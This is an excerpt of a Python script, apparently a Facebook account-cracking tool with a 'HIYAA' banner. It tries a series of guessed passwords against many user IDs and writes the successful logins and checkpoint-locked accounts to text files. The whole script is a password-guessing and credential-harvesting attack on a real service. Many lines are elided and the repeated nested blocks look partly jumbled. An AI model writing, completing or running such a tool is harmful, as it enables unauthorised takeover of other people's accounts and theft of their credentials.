...
logo = """      
\033[1;92m888   | 888 Y88b    /      e           e      
888___| 888  Y88b  /      d8b         d8b     
888   | 888   Y88b/      /Y88b       /Y88b    
888   | 888    Y8Y      /  Y88b     /  Y88b   
888   | 888     Y      /____Y88b   /____Y88b  
888   | 888    /      /      Y88b /      Y88b                                                           
\033[0;94m-----------------------------------------------------
 \033[1;91m(*)\033[1;92m Developer: (HIYAA)
 \033[1;91m(*)\033[1;92m WhatsApp :   koi zarurat nahi hai
 \033[1;91m(*)\033[1;92m Github   : https://github.com/hiyaa02
\033[1;91m-----------------------------------------------------
"""
def tool():
	os.system("clear")
...
def main():
	...
	print("")
	os.system('xdg-open https://www.facebook.com/8r0k3nhIy44.9')
	log_sel()
def log_sel():
...
def crack_select():
	...
	if select =="1":
		...
		try:
			...
			print(logo)
			print('')
			print("  ðŸ˜¼HIYAAðŸ˜¼ START CRACKING.....")
			print('')
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [HIYAA-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("HIYAAok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [HIYAA-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("HIYAAcp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m [HIYAA-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("HIYAAok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [HIYAA-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("HIYAAcp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [HIYAA-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("HIYAAok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [HIYAA-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("HIYAAcp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;32m [HIYAA-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("HIYAAok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;33m [HIYAA-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("HIYAAcp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;32m [HIYAA-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("HIYAAok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [HIYAA-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("HIYAAcp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													q = json.loads(data)
													if "access_token" in q:
														print(" \033[1;32m [HIYAA-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("HIYAAok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;33m [HIYAA-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("HIYAAcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															q = json.loads(data)
															if "access_token" in q:
																print(" \033[1;32m [HIYAA-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("HIYAAok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [HIYAA-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("HIYAAcp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
											...
											if "access_token" in q:
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													if "access_token" in q:
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;28m [HIYAA-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("HIYAAcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
